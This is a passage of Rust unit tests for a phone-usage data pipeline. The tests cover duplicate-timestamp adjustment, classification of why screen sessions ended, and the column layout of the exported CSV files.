        );

        // Both stop lists feed one priority class, and the alternate spelling
        // of Screen Non-Interactive is normalized before the lookup.
        let mixed = unalign_duplicate_timestamps(
            rows_from_events(&[
                ("2026-03-07 16:00:00", "Device Shutdown", "com.example.chat"),
                (
                    "2026-03-07 16:00:00",
                    "Screen Non-interactive",
                    "com.example.chat",
                ),
                ("2026-03-07 16:00:00", "Activity Paused", "com.example.chat"),
            ]),
            &same_app_stop_types,
            &[
                "Device Shutdown".to_string(),
                "Screen Non-Interactive".to_string(),
            ],
        )
        .expect("duplicate-timestamp adjustment stays representable");
        assert_eq!(
            mixed
                .iter()
                .map(|row| row.interaction_type.as_str())
                .collect::<Vec<_>>(),
            vec![
                "Device Shutdown",
                "Screen Non-Interactive",
                "Activity Paused"
            ],
            "every stop spelling shares one priority, so file order decides"
        );

        // Rows that are already distinct are returned untouched: the pipeline
        // must not shift timestamps it did not need to shift.
        let untouched = rows_from_events(&[
            (
                "2026-03-07 10:00:00",
                "Activity Resumed",
                "com.example.chat",
            ),
            ("2026-03-07 10:00:01", "Activity Paused", "com.example.chat"),
        ]);
        let expected: Vec<i64> = untouched.iter().map(|row| row.event_timestamp_ns).collect();
        let unchanged =
            unalign_duplicate_timestamps(untouched, &same_app_stop_types, &other_stop_types)
                .expect("duplicate-timestamp adjustment stays representable");
        assert_eq!(
            unchanged
                .iter()
                .map(|row| row.event_timestamp_ns)
                .collect::<Vec<_>>(),
            expected
        );

        // A single row, and no rows at all, take the early return.
        assert_eq!(
            unalign_duplicate_timestamps(Vec::new(), &same_app_stop_types, &other_stop_types)
                .expect("duplicate-timestamp adjustment stays representable")
                .len(),
            0
        );
        assert_eq!(
            unalign_duplicate_timestamps(
                rows_from_events(&[(
                    "2026-03-07 10:00:00",
                    "Activity Resumed",
                    "com.example.chat"
                )]),
                &same_app_stop_types,
                &other_stop_types,
            )
            .expect("duplicate-timestamp adjustment stays representable")[0]
                .event_timestamp_ns,
            parse_chronicle_timestamp_ns("2026-03-07 10:00:00").expect("fixture timestamp")
        );
    }

    /// `delivery:B06` (`b06_duplicate_timestamp_adjustment_extremes`): the
    /// 1 µs unalignment steps are checked subtractions. Ties near `i64::MIN`
    /// refuse with the typed B06 token instead of wrapping (release) or
    /// panicking (debug); ties anywhere the steps stay representable —
    /// including at zero and `i64::MAX` — unalign exactly.
    #[test]
    fn tied_minimum_timestamps_unalign_in_i128_or_refuse_without_publishing() {
        let same_app_stop_types = vec!["Activity Paused".to_string()];
        let other_stop_types = vec!["Device Shutdown".to_string()];
        let tied_at = |base: i64, count: usize| -> Vec<Row> {
            let events: Vec<(&str, &str, &str)> = (0..count)
                .map(|index| {
                    (
                        "2026-03-07 10:00:00",
                        if index == 0 {
                            "Activity Resumed"
                        } else {
                            "Activity Paused"
                        },
                        "com.example.chat",
                    )
                })
                .collect();
            let mut rows = rows_from_events(&events);
            for row in &mut rows {
                *row.edit_temporal().event_timestamp_ns = base;
            }
            rows
        };
        let refused =
            b06::MaximumDurationRefusalReason::DuplicateTimestampAdjustmentUnrepresentable
                .execution_error();
        for count in [2_usize, 3] {
            assert_eq!(
                unalign_duplicate_timestamps(
                    tied_at(i64::MIN, count),
                    &same_app_stop_types,
                    &other_stop_types
                )
                .err()
                .as_deref(),
                Some(refused.as_str()),
                "{count} rows tied at i64::MIN"
            );
        }
        // Two rows tied at MIN+1000: the first-ordered row moves by
        // 2 × 1000 → below MIN → refused; at MIN+2000 both steps fit.
        assert_eq!(
            unalign_duplicate_timestamps(
                tied_at(i64::MIN + 1_000, 2),
                &same_app_stop_types,
                &other_stop_types
            )
            .err()
            .as_deref(),
            Some(refused.as_str())
        );
        let fits = unalign_duplicate_timestamps(
            tied_at(i64::MIN + 2_000, 2),
            &same_app_stop_types,
            &other_stop_types,
        )
        .expect("both steps representable");
        assert_eq!(
            fits.iter()
                .map(|row| row.event_timestamp_ns)
                .collect::<Vec<_>>(),
            vec![i64::MIN, i64::MIN + 1_000],
        );
        for base in [0_i64, i64::MAX] {
            let nudged = unalign_duplicate_timestamps(
                tied_at(base, 3),
                &same_app_stop_types,
                &other_stop_types,
            )
            .expect("far from i64::MIN every step is representable");
            let mut stamps: Vec<i64> = nudged.iter().map(|row| row.event_timestamp_ns).collect();
            stamps.sort_unstable();
            assert_eq!(
                stamps,
                vec![base - 3_000, base - 2_000, base - 1_000],
                "tied at {base}"
            );
        }
    }

    fn literature_screen_session(duration_ns: i64, foreground_package: Option<&str>) -> Row {
        let mut row = rows_from_events(&[(
            "2026-03-07 10:00:00",
            "Screen Interactive",
            foreground_package.unwrap_or(""),
        )])
        .remove(0);
        let start = row.event_timestamp_ns;
        let data = row.edit_all();
        data.interaction_type = SCREEN_USAGE.into();
        data.start_timestamp_ns = Some(start);
        data.stop_timestamp_ns = Some(start + duration_ns);
        data.duration_seconds = Some(duration_ns as f64 / 1e9);
        data.duration_minutes = Some(duration_ns as f64 / 60e9);
        data.screen_usage_foreground_app_package = foreground_package.map(Into::into);
        data.screen_usage_app_observed = Some(foreground_package.is_some());
        data.screen_usage_lock_screen_only = Some(0);
        row
    }

    #[test]
    fn literature_screen_policies_preserve_15s_and_60m_boundaries() {
        let at_15 = 15_000_000_000;
        let over_15 = at_15 + 1;
        let classified = incremental::apply_screen_session_policies(
            vec![
                literature_screen_session(at_15, None),
                literature_screen_session(over_15, None),
            ],
            ScreenSessionClassificationPolicy::PhoneCheckInclusive15s,
            0.0,
            ScreenSessionMaximumDurationDisposition::None,
            LockedScreenAudioDisposition::Include,
        );
        assert_eq!(
            classified
                .iter()
                .map(|row| row.screen_usage_session_classification.as_deref())
                .collect::<Vec<_>>(),
            vec![Some("phone_check"), None],
        );

        let classified = incremental::apply_screen_session_policies(
            vec![
                literature_screen_session(at_15, None),
                literature_screen_session(over_15, None),
                literature_screen_session(at_15, Some("com.example.app")),
            ],
            ScreenSessionClassificationPolicy::NullNoAppStrictGt15sVsApp,
            0.0,
            ScreenSessionMaximumDurationDisposition::None,
            LockedScreenAudioDisposition::Include,
        );
        assert_eq!(
            classified
                .iter()
                .map(|row| row.screen_usage_session_classification.as_deref())
                .collect::<Vec<_>>(),
            vec![None, Some("null"), Some("app")],
        );

        let shortened = incremental::apply_screen_session_policies(
            vec![literature_screen_session(20_000_000_000, Some("app.a"))],
            ScreenSessionClassificationPolicy::NullNoAppStrictGt15sVsApp,
            0.25,
            ScreenSessionMaximumDurationDisposition::Truncate,
            LockedScreenAudioDisposition::Include,
        );
        assert_eq!(shortened[0].duration_seconds, Some(15.0));
        assert_eq!(shortened[0].screen_usage_app_observed, None);
        assert_eq!(shortened[0].screen_usage_session_classification, None);

        let at_60m = 3_600_000_000_000;
        let capped = incremental::apply_screen_session_policies(
            vec![
                literature_screen_session(at_60m, None),
                literature_screen_session(at_60m + 1, None),
            ],
            ScreenSessionClassificationPolicy::None,
            60.0,
            ScreenSessionMaximumDurationDisposition::Truncate,
            LockedScreenAudioDisposition::Include,
        );
        assert_eq!(capped[0].duration_minutes, Some(60.0));
        assert_eq!(capped[0].screen_usage_end_reason, None);
        assert_eq!(capped[1].duration_minutes, Some(60.0));
        assert_eq!(
            capped[1].screen_usage_end_reason.as_deref(),
            Some("duration_cap")
        );
        assert_eq!(
            capped[1].stop_timestamp_ns,
            capped[1].start_timestamp_ns.map(|start| start + at_60m),
        );
    }

    #[test]
    fn locked_audio_policy_bounds_apps_to_interactive_screen() {
        let screen = literature_screen_session(10_000_000_000, None);
        let screen_start = screen.start_timestamp_ns.expect("screen start");
        let mut overlapping = literature_screen_session(19_000_000_000, Some("com.music"));
        {
            let temporal = overlapping.edit_temporal();
            *temporal.start_timestamp_ns = Some(screen_start + 1_000_000_000);
            *temporal.stop_timestamp_ns = Some(screen_start + 20_000_000_000);
        }
        let mut locked_only = literature_screen_session(2_000_000_000, Some("com.music"));
        {
            let temporal = locked_only.edit_temporal();
            *temporal.start_timestamp_ns = Some(screen_start + 11_000_000_000);
            *temporal.stop_timestamp_ns = Some(screen_start + 13_000_000_000);
        }
        let bounded = incremental::bound_app_rows_to_interactive_screen(
            vec![overlapping, locked_only],
            &[screen],
        );
        assert_eq!(bounded.len(), 1);
        assert_eq!(
            bounded[0].stop_timestamp_ns,
            Some(screen_start + 10_000_000_000)
        );
        assert_eq!(bounded[0].duration_seconds, Some(9.0));
    }

    /// Every screen session carries an end reason and a confidence into the
    /// screen-usage CSV, and the ladder that assigns them is the only
    /// explanation a researcher gets for why a session ended when it did.
    #[test]
    fn screen_sessions_are_classified_by_the_documented_end_reason_ladder() {
        fn classify(
            events: &[(&str, &str, &str)],
            apps_forcing: &[(&str, &str)],
        ) -> Vec<(String, f64, u8, Option<f64>)> {
            let rows = rows_from_events(events);
            let closes = incremental::infer_screen_session_skeletons(&rows);
            let keyguard = incremental::index_keyguard_events(&rows);
            let forcing: HashMap<String, String> = apps_forcing
                .iter()
                .map(|(package, label)| (package.to_string(), label.to_string()))
                .collect();
            incremental::classify_screen_sessions(
                &rows,
                &closes,
                &keyguard,
                &forcing,
                incremental::ScreenClassificationSettings {
                    auto_lock_timeout_seconds: 120.0,
                    auto_lock_tolerance_seconds: 30.0,
                    manual_lock_max_tail_seconds: 30.0,
                    keyguard_near_stop_seconds: 2.0,
                    locked_screen_audio_disposition: LockedScreenAudioDisposition::Include,
                },
            )
            .iter()
            .map(|session| {
                (
                    session
                        .screen_usage_end_reason
                        .as_ref()
                        .map(|reason| reason.to_string())
                        .unwrap_or_default(),
                    session.screen_usage_end_reason_confidence.unwrap_or(-1.0),
                    session.screen_usage_lock_screen_only.unwrap_or(255),
                    session.screen_usage_tail_gap_seconds,
                )
            })
            .collect()
        }

        // The screen never went off before the export ended: there is no stop
        // event to explain, and the session has no duration.
        assert_eq!(
            classify(
                &[
                    ("2026-03-07 10:00:00", "Screen Interactive", ""),
                    (
                        "2026-03-07 10:00:01",
                        "Activity Resumed",
                        "com.example.chat"
                    ),
                ],
                &[]
            ),
            vec![("missing_stop".to_string(), 1.0, 0, None)]
        );

        for (stop, expected) in [
            (
                "Screen Non-Interactive/Manual Hardware Button",
                "manual_hardware_button",
            ),
            ("Screen Non-Interactive/Aborted Unlock", "aborted_unlock"),
            ("Screen Non-Interactive/Idle Timeout", "idle_timeout"),
        ] {
            assert_eq!(
                classify(
                    &[
                        ("2026-03-07 10:00:00", "Screen Interactive", ""),
                        ("2026-03-07 10:00:10", stop, ""),
                    ],
                    &[],
                ),
                vec![(expected.to_string(), 1.0, 0, None)],
            );
        }

        // Woken straight into the lock screen and never unlocked: no app was
        // ever in the foreground, so this is not real screen usage.
        assert_eq!(
            classify(
                &[
                    (
                        "2026-03-07 10:00:00",
                        "Screen Interactive/Keyguard Shown",
                        ""
                    ),
                    ("2026-03-07 10:00:10", "Screen Non-Interactive", ""),
                ],
                &[]
            ),
            vec![("lock_screen_only".to_string(), 0.95, 1, None)]
        );

        // A video app on the forces-screen-open list held the screen awake far
        // past the auto-lock timeout.
        assert_eq!(
            classify(
                &[
                    ("2026-03-07 10:00:00", "Screen Interactive", ""),
                    (
                        "2026-03-07 10:00:01",
                        "Activity Resumed",
                        "com.example.video"
                    ),
                    ("2026-03-07 10:05:00", "Screen Non-Interactive", ""),
                ],
                &[("com.example.video", "video")]
            ),
            vec![(
                "app_kept_awake_or_extended".to_string(),
                0.9,
                0,
                Some(299.0)
            )]
        );

        // A forcing app that let the screen go at exactly the auto-lock timeout
        // did not keep it awake: the timeout is where an ordinary auto-lock
        // lands, so only a tail past it is evidence the app extended anything.
        assert_eq!(
            classify(
                &[
                    ("2026-03-07 10:00:00", "Screen Interactive", ""),
                    (
                        "2026-03-07 10:00:01",
                        "Activity Resumed",
                        "com.example.video"
                    ),
                    ("2026-03-07 10:02:01", "Screen Non-Interactive", ""),
                ],
                &[("com.example.video", "video")]
            ),
            vec![("probable_auto_lock".to_string(), 0.9, 0, Some(120.0))]
        );

        // The screen went off within the manual-lock tail, so the person almost
        // certainly pressed the button.
        assert_eq!(
            classify(
                &[
                    ("2026-03-07 10:00:00", "Screen Interactive", ""),
                    (
                        "2026-03-07 10:00:01",
                        "Activity Resumed",
                        "com.example.chat"
                    ),
                    ("2026-03-07 10:00:11", "Screen Non-Interactive", ""),
                ],
                &[]
            ),
            vec![("probable_manual_lock".to_string(), 0.85, 0, Some(10.0))]
        );
        // The manual-lock tail is inclusive at its edge.
        assert_eq!(
            classify(
                &[
                    ("2026-03-07 10:00:00", "Screen Interactive", ""),
                    (
                        "2026-03-07 10:00:01",
                        "Activity Resumed",
                        "com.example.chat"
                    ),
                    ("2026-03-07 10:00:31", "Screen Non-Interactive", ""),
                ],
                &[]
            ),
            vec![("probable_manual_lock".to_string(), 0.85, 0, Some(30.0))]
        );

        // Idle for about the auto-lock timeout, inside the tolerance.
        for (stop, gap) in [
            ("2026-03-07 10:02:01", 120.0),
            ("2026-03-07 10:01:31", 90.0),
            ("2026-03-07 10:02:31", 150.0),
        ] {
            assert_eq!(
                classify(
                    &[
                        ("2026-03-07 10:00:00", "Screen Interactive", ""),
                        (
                            "2026-03-07 10:00:01",
                            "Activity Resumed",
                            "com.example.chat"
                        ),
                        (stop, "Screen Non-Interactive", ""),
                    ],
                    &[]
                ),
                vec![("probable_auto_lock".to_string(), 0.9, 0, Some(gap))],
                "a {gap}s tail is within the auto-lock tolerance"
            );
        }

        // One second past the tolerance there is no explanation left except a
        // long idle.
        assert_eq!(
            classify(
                &[
                    ("2026-03-07 10:00:00", "Screen Interactive", ""),
                    (
                        "2026-03-07 10:00:01",
                        "Activity Resumed",
                        "com.example.chat"
                    ),
                    ("2026-03-07 10:02:32", "Screen Non-Interactive", ""),
                ],
                &[]
            ),
            vec![("extended_idle_or_unknown".to_string(), 0.5, 0, Some(151.0))]
        );

        // A long tail, but the keyguard appeared right before the screen went
        // off, so the lock is still the better explanation - at lower
        // confidence than an observed short tail.
        assert_eq!(
            classify(
                &[
                    ("2026-03-07 10:00:00", "Screen Interactive", ""),
                    (
                        "2026-03-07 10:00:01",
                        "Activity Resumed",
                        "com.example.chat"
                    ),
                    ("2026-03-07 10:03:20", "Keyguard Shown", ""),
                    ("2026-03-07 10:03:21", "Screen Non-Interactive", ""),
                ],
                &[]
            ),
            vec![("probable_manual_lock".to_string(), 0.7, 0, Some(200.0))]
        );
        // Three seconds is outside the keyguard window.
        assert_eq!(
            classify(
                &[
                    ("2026-03-07 10:00:00", "Screen Interactive", ""),
                    (
                        "2026-03-07 10:00:01",
                        "Activity Resumed",
                        "com.example.chat"
                    ),
                    ("2026-03-07 10:03:18", "Keyguard Shown", ""),
                    ("2026-03-07 10:03:21", "Screen Non-Interactive", ""),
                ],
                &[]
            ),
            vec![("extended_idle_or_unknown".to_string(), 0.5, 0, Some(200.0))]
        );

        // The screen went on and off with nothing in between, so there is no
        // last activity to measure a tail from.
        assert_eq!(
            classify(
                &[
                    ("2026-03-07 10:00:00", "Screen Interactive", ""),
                    ("2026-03-07 10:00:10", "Screen Non-Interactive", ""),
                ],
                &[]
            ),
            vec![("unknown".to_string(), 0.25, 0, None)]
        );
    }

    /// The classified session is a synthetic row: it takes its identity from
    /// the screen-on event, its span from the state machine, and it must not
    /// carry the app fields of the row it was cloned from.
    #[test]
    fn a_classified_screen_session_reports_its_own_span_and_foreground_app() {
        let rows = rows_from_events(&[
            ("2026-03-07 10:00:00", "Screen Interactive", ""),
            (
                "2026-03-07 10:00:30",
                "Activity Resumed",
                "com.example.chat",
            ),
            ("2026-03-07 10:00:50", "Screen Non-Interactive", ""),
        ]);
        let closes = incremental::infer_screen_session_skeletons(&rows);
        let keyguard = incremental::index_keyguard_events(&rows);
        let sessions = incremental::classify_screen_sessions(
            &rows,
            &closes,
            &keyguard,
            &HashMap::new(),
            incremental::ScreenClassificationSettings {
                auto_lock_timeout_seconds: 120.0,
                auto_lock_tolerance_seconds: 30.0,
                manual_lock_max_tail_seconds: 30.0,
                keyguard_near_stop_seconds: 2.0,
                locked_screen_audio_disposition: LockedScreenAudioDisposition::Include,
            },
        );
        assert_eq!(sessions.len(), 1);
        let session = &sessions[0];
        let start = parse_chronicle_timestamp_ns("2026-03-07 10:00:00").expect("fixture timestamp");
        let stop = parse_chronicle_timestamp_ns("2026-03-07 10:00:50").expect("fixture timestamp");
        assert_eq!(session.interaction_type.as_str(), SCREEN_USAGE);
        assert_eq!(session.event_timestamp_ns, start);
        assert_eq!(session.start_timestamp_ns, Some(start));
        assert_eq!(session.stop_timestamp_ns, Some(stop));
        assert_eq!(session.duration_seconds, Some(50.0));
        assert_eq!(session.duration_minutes, Some(50.0 / 60.0));
        assert_eq!(session.data_time_gap_hours, 0.0);
        assert!(session.application_label.is_empty());
        assert_eq!(session.app_package_name.as_str(), "com.example.chat");
        assert_eq!(
            session
                .screen_usage_foreground_app_package
                .as_ref()
                .map(|package| package.to_string()),
            Some("com.example.chat".to_string())
        );
        assert_eq!(
            session
                .screen_usage_stop_event_type
                .as_ref()
                .map(|value| value.to_string()),
            Some("Screen Non-Interactive".to_string())
        );
        assert_eq!(
            session.screen_usage_last_activity_timestamp_ns,
            Some(parse_chronicle_timestamp_ns("2026-03-07 10:00:30").expect("fixture timestamp"))
        );
        // The synthetic row is pushed past every raw row so ordering is stable.
        assert_eq!(session.index, rows[0].index + 1_000_000);
    }

    /// Build usage rows for the analysis stages, which read only the
    /// participant, date, username, interaction type and duration.
    fn usage_rows(rows: &[(&str, &str, &str, &str, Option<f64>)]) -> Vec<Row> {
        let mut built = rows_from_events(
            &rows
                .iter()
                .enumerate()
                .map(|(index, _)| {
                    (
                        [
                            "2026-03-07 10:00:00",
                            "2026-03-07 10:01:00",
                            "2026-03-07 10:02:00",
                            "2026-03-07 10:03:00",
                            "2026-03-07 10:04:00",
                            "2026-03-07 10:05:00",
                            "2026-03-07 10:06:00",
                            "2026-03-07 10:07:00",
                        ][index],
                        "Activity Resumed",
                        "com.example.chat",
                    )
                })
                .collect::<Vec<_>>(),
        );
        for (row, (participant, date, username, interaction, minutes)) in built.iter_mut().zip(rows)
        {
            let data = row.edit_all();
            data.participant_id = (*participant).into();
            data.date = (*date).into();
            data.username = (*username).into();
            data.interaction_type = (*interaction).into();
            data.duration_minutes = *minutes;
        }
        built
    }

    /// Split a written CSV into rows of fields, honouring RFC 4180 quoting so a
    /// value that legitimately contains a comma is not counted as two fields.
    fn csv_lines(bytes: &[u8]) -> Vec<Vec<String>> {
        let text = String::from_utf8(bytes.to_vec()).expect("csv output is utf-8");
        text.lines()
            .map(|line| {
                let mut fields = vec![String::new()];
                let mut quoted = false;
                let mut characters = line.chars().peekable();
                while let Some(character) = characters.next() {
                    match character {
                        '"' if quoted && characters.peek() == Some(&'"') => {
                            characters.next();
                            fields.last_mut().expect("a field is open").push('"');
                        }
                        '"' => quoted = !quoted,
                        ',' if !quoted => fields.push(String::new()),
                        _ => fields.last_mut().expect("a field is open").push(character),
                    }
                }
                fields
            })
            .collect()
    }

    fn app_csv_rows() -> Vec<Row> {
        let mut rows = rows_from_events(&[
            (
                "2026-03-07 10:00:00",
                "Activity Resumed",
                "com.example.chat",
            ),
            (
                "2026-03-07 10:05:00",
                "Activity Resumed",
                "com.example.video",
            ),
        ]);
        for row in rows.iter_mut() {
            let data = row.edit_all();
            data.interaction_type = APP_USAGE.into();
            data.start_timestamp_ns = Some(0);
            data.stop_timestamp_ns = Some(60_000_000_000);
            data.duration_seconds = Some(60.0);
            data.duration_minutes = Some(1.0);
            data.usage_layer = Some("primary".into());
            data.genre_id_scraped = Some("Social".into());
            data.broad_app_category = Some("COMMUNICATION".into());
            data.codebook_fields = Arc::new(
                (0..CODEBOOK_RENAME_PAIRS.len())
                    .map(|index| Some(format!("field{index}")))
                    .collect(),
            );
        }
        rows
    }

    /// A reader lines an exported row up against the header by position. The
    /// header and the row body are built in two different places from the same
    /// options, so an option that adds or removes a column has to move both or
    /// every column after it shifts. This walks the options that change the
    /// column set and checks the header against the declared contract and every
    /// row against the header.
    #[test]
    fn app_and_screen_csv_rows_line_up_with_their_declared_header() {
        let rows = app_csv_rows();
        for use_app_codebook in [false, true] {
            for include_aliases in [false, true] {
                for model_concurrent_usage in [false, true] {
                    for use_background_apps_file in [false, true] {
                        let mut opts = test_options();
                        opts.use_app_codebook = use_app_codebook;
                        opts.model_concurrent_usage = model_concurrent_usage;
                        opts.use_background_apps_file = use_background_apps_file;
                        let label = format!(
                            "codebook={use_app_codebook} aliases={include_aliases} \
                             concurrent={model_concurrent_usage} \
                             background={use_background_apps_file}"
                        );

                        let written = write_app_csv_from_iter(rows.iter(), &opts, include_aliases);
                        let lines = csv_lines(&written);
                        let declared = declared_app_output_columns(
                            use_app_codebook,
                            include_aliases,
                            model_concurrent_usage || use_background_apps_file,
                            opts.custom_app_engagement_duration,
                            opts.include_app_usage_end_reason,
                            opts.session_grouping_policy != SessionGroupingPolicy::None,
                        );
                        assert_eq!(lines[0], declared, "app header for {label}");
                        assert_eq!(lines.len(), rows.len() + 1, "app row count for {label}");
                        for (index, line) in lines.iter().enumerate().skip(1) {
                            assert_eq!(
                                line.len(),
                                declared.len(),
                                "app row {index} field count for {label}",
                            );
                        }

                        let written = write_screen_csv(&rows, &opts);
                        let lines = csv_lines(&written);
                        assert_eq!(
                            lines[0],
                            declared_screen_output_columns(),
                            "screen header for {label}",
                        );
                        assert_eq!(lines.len(), rows.len() + 1, "screen row count for {label}");
                        for (index, line) in lines.iter().enumerate().skip(1) {
                            assert_eq!(
                                line.len(),
                                lines[0].len(),
                                "screen row {index} field count for {label}",
                            );
                        }
                    }
                }
            }
        }
    }

    #[test]
    fn foundational_semantics_columns_are_opt_in_and_line_up_with_their_values() {
        let mut options = test_options();
        let default_columns = build_app_columns(&options, false);
        for column in [
            "micro_use_classification",
            "raw_episode_duration_seconds",
            "minimum_duration_qualified",
            "minimum_duration_aggregate_eligible",
        ] {
            assert!(
                !default_columns.iter().any(|candidate| candidate == column),
                "default output shape unexpectedly contains {column}",
            );
        }

        options.micro_use_classification_policy = MicroUseClassificationPolicy::OkoshiLt5s;
        options.minimum_usage_duration = 60.0;
        options.minimum_duration_comparator = MinimumDurationComparator::InclusiveLe;
        options.minimum_duration_disposition = MinimumDurationDisposition::RetainButExclude;
        let classified = incremental::classify_episode_durations(
            episode_rows(&[(
                ACTIVITY_RESUMED,
                "com.example.chat",
                Some(0),
                Some(59_000_000_000),
            )]),
            &BTreeSet::new(),
            options.micro_use_classification_policy,
            options.minimum_usage_duration,
            options.minimum_duration_comparator,
            options.minimum_duration_disposition,
            &[],
            &b06::MaximumDurationRowStage::omitted(),
        ).expect("classification with the omitted B06 shape never refuses");
        let lines = csv_lines(&write_app_csv_from_iter(classified.iter(), &options, false));
        assert_eq!(lines.len(), 2);
        let columns = build_app_columns(&options, false);
        assert_eq!(lines[0], columns);
        let value = |column: &str| {
            let index = columns
                .iter()
                .position(|candidate| candidate == column)
                .expect("foundational column is declared");
            lines[1][index].as_str()
        };
        assert_eq!(value("micro_use_classification"), "not_micro_use");
        assert_eq!(value("raw_episode_duration_seconds"), "59.0");
        assert_eq!(value("minimum_duration_qualified"), "true");
        assert_eq!(value("minimum_duration_aggregate_eligible"), "false");
    }

    #[test]
    fn screen_classification_output_and_digest_are_opt_in() {
        let mut options = test_options();
        let rows = vec![literature_screen_session(15_000_000_000, None)];
        let default_csv = csv_lines(&write_screen_csv(&rows, &options));
        assert_eq!(default_csv[0], declared_screen_output_columns());
        assert!(!default_csv[0]
            .iter()
            .any(|column| column == "screen_usage_session_classification"));
        let baseline = workflow_checkpoint("screen-classification", &[("rows", &rows)], &[]);

        options.screen_session_classification_policy =
            ScreenSessionClassificationPolicy::PhoneCheckInclusive15s;
        let classified = incremental::apply_screen_session_policies(
            rows.clone(),
            options.screen_session_classification_policy,
            0.0,
            ScreenSessionMaximumDurationDisposition::None,
            LockedScreenAudioDisposition::Include,
        );
        let enabled_csv = csv_lines(&write_screen_csv(&classified, &options));
        let index = enabled_csv[0]
            .iter()
            .position(|column| column == "screen_usage_session_classification")
            .unwrap();
        assert_eq!(enabled_csv[1][index], "phone_check");
        assert_eq!(enabled_csv[1].len(), enabled_csv[0].len());
        assert_eq!(
            csv_lines(&write_screen_csv(&[], &options))[0],
            enabled_csv[0]
        );
        let unclassified = csv_lines(&write_screen_csv(&rows, &options));
        assert_eq!(unclassified[0], enabled_csv[0]);
        assert_eq!(unclassified[1][index], "");
        assert_eq!(unclassified[1].len(), unclassified[0].len());

        let enabled = workflow_checkpoint("screen-classification", &[("rows", &classified)], &[]);
        assert_ne!(
            enabled.classification_digest,
            baseline.classification_digest
        );
        assert_ne!(enabled.terminal_digest, baseline.terminal_digest);
        assert_eq!(
            enabled.row_membership_digest,
            baseline.row_membership_digest
        );
        assert_eq!(enabled.row_order_digest, baseline.row_order_digest);
        assert_eq!(
            enabled.temporal_state_digest,
            baseline.temporal_state_digest
        );
        let mut changed = classified.clone();
        changed[0].edit_all().screen_usage_session_classification = Some("app".into());
        let changed = workflow_checkpoint("screen-classification", &[("rows", &changed)], &[]);
        assert_ne!(changed.classification_digest, enabled.classification_digest);
        assert_ne!(changed.terminal_digest, enabled.terminal_digest);
    }

    /// Two things a row carries on its own, rather than taking from the run's
    /// settings: the timezone its timestamps are rendered in, and whether its
    /// genre columns were collapsed. A row keeps its own recorded timezone even
    /// when the run selected a different one, and the four collapsed-genre
    /// columns are blanked only on rows that actually had them collapsed.
    #[test]
    fn exported_rows_use_their_own_timezone_and_collapse_only_where_marked() {
        let mut rows = app_csv_rows();
        // The same instant in two zones, so the exported local timestamps can
        // only differ if each row is rendered in its own timezone.
        let instant = rows[0].event_timestamp_ns;
        rows[0].edit_all().timezone = "UTC".into();
        let collapsed = {
            let data = rows[1].edit_all();
            data.timezone = "America/New_York".into();
            data.event_timestamp_ns = instant;
            data.codebook_genre_fields_cleared = true;
            true
        };
        assert!(collapsed);

        let mut opts = test_options();
        opts.timezone = "UTC".into();
        opts.use_app_codebook = true;
        let written = write_app_csv_from_iter(rows.iter(), &opts, false);
        let lines = csv_lines(&written);
        let column = |name: &str| {
            lines[0]
                .iter()
                .position(|header| header == name)
                .unwrap_or_else(|| panic!("{name} is not an exported column"))
        };

        let timestamp = column("event_timestamp");
        assert_ne!(
            lines[1][timestamp], lines[2][timestamp],
            "two rows recorded at the same instant in different timezones \
             rendered the same local timestamp",
        );
        assert_eq!(lines[1][column("timezone")], "UTC");
        assert_eq!(lines[2][column("timezone")], "America/New_York");

        for (index, (_, exported)) in CODEBOOK_RENAME_PAIRS.iter().enumerate() {
            let value = column(exported);
            assert_eq!(
                lines[1][value],
                format!("field{index}"),
                "a row with no collapsed genre columns lost {exported}",
            );
            let expected = if COLLAPSED_GENRE_FIELD_INDICES.contains(&index) {
                String::new()
            } else {
                format!("field{index}")
            };
            assert_eq!(
                lines[2][value], expected,
                "a row with collapsed genre columns exported {exported} wrongly",
            );
        }

        // The screen export is a separate writer carrying the same per-row
        // timezone rule, so the same two rows are checked through it.
        let screen = csv_lines(&write_screen_csv(&rows, &opts));
        let screen_timestamp = screen[0]
            .iter()
            .position(|header| header == "event_timestamp")
            .expect("event_timestamp is a screen column");
        assert_ne!(
            screen[1][screen_timestamp], screen[2][screen_timestamp],
            "the screen export rendered two timezones as the same local timestamp",
        );
    }

    /// Screen-gated crediting can only witness a device that reports both
    /// screen states: with one alone there is no way to tell a lit screen from
    /// a dark one, so the participant has no usable witness and falls to the
    /// no-witness rules instead of being credited from a half-signal.
    #[test]
    fn screen_credit_capability_needs_both_screen_states() {
        let capable = |kinds: &[&str]| {
            let stamps = [
                "2026-03-07 10:00:00",
                "2026-03-07 10:01:00",
                "2026-03-07 10:02:00",
            ];
            let events: Vec<(&str, &str, &str)> = kinds
                .iter()
                .enumerate()
                .map(|(index, kind)| (stamps[index], *kind, "com.example.chat"))
                .collect();
            let rows = rows_from_events(&events);
            build_screen_credit_substrate(&rows)
                .expect("screen credit substrate")
                .capable
                .contains("P01")
        };
        assert!(capable(&["Screen Interactive", "Screen Non-Interactive"]));
        assert!(!capable(&["Screen Interactive", "Screen Interactive"]));
        assert!(!capable(&[
            "Screen Non-Interactive",
            "Screen Non-Interactive",
        ]));
        assert!(!capable(&["Activity Resumed", "Activity Paused"]));
        // Every label the witness reads as a screen transition counts, so a
        // device that reports the screen in fused or device-level labels is
        // gated rather than credited in full.
        assert!(capable(&["Screen Interactive", "Device Screen Off"]));
        assert!(capable(&[
            "Screen Interactive/Keyguard Shown",
            "Screen Non-Interactive/Keyguard Hidden",
        ]));
        // Interaction and power events are witnesses, not screen reports.
        assert!(!capable(&["User Interaction", "Device Shutdown"]));
    }

    /// A filtered app-usage row keeps its label but must not keep its timing:
    /// a start, stop, or duration left behind would let a filtered row be
    /// counted as usage downstream. Any one of the four fields being present is
    /// enough to require the clear, and an unfiltered row keeps everything.
    #[test]
    fn filtered_app_usage_rows_lose_every_timing_field() {
        type Timing = (Option<i64>, Option<i64>, Option<f64>, Option<f64>);
        const EMPTY: Timing = (None, None, None, None);

        let base = rows_from_events(&[(
            "2026-03-07 10:00:00",
            "Activity Resumed",
            "com.example.chat",
        )]);
        let timing = |row: &Row| {
            (
                row.start_timestamp_ns,
                row.stop_timestamp_ns,
                row.duration_seconds,
                row.duration_minutes,
            )
        };
        let build = |interaction: &str, fields: Timing| {
            let mut row = base[0].clone();
            let data = row.edit_all();
            data.interaction_type = interaction.into();
            data.start_timestamp_ns = fields.0;
            data.stop_timestamp_ns = fields.1;
            data.duration_seconds = fields.2;
            data.duration_minutes = fields.3;
            row
        };

        for present in [
            (Some(1), None, None, None),
            (None, Some(2), None, None),
            (None, None, Some(3.0), None),
            (None, None, None, Some(4.0)),
